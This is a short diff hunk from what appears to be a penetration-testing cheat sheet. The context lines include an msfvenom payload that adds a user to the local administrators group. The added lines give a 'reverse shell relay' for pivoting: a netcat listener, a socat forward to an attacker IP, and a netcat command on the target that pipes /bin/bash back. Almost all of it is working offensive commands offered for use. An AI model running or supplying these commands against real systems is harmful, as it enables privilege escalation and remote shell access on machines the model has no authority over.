@@ -39,4 +39,8 @@ msfvenom -p windows/exec CMD='net localgroup aministrators <username> /add' -f e
  
 x86_64-w64-mingw32-gcc <filename>.c -o <filename>.exe
  
-Basic XXE
+PIVOTING  
+REVERSE SHELL RELAY
+ATTACKER > sudo nc -nvlp 443
+PIVOT > ./socat tcp-l:8000 tcp:<ATTACKER_IP>:443 &
+TARGET > nc <PIVOT_IP> 8000 -e /bin/bash
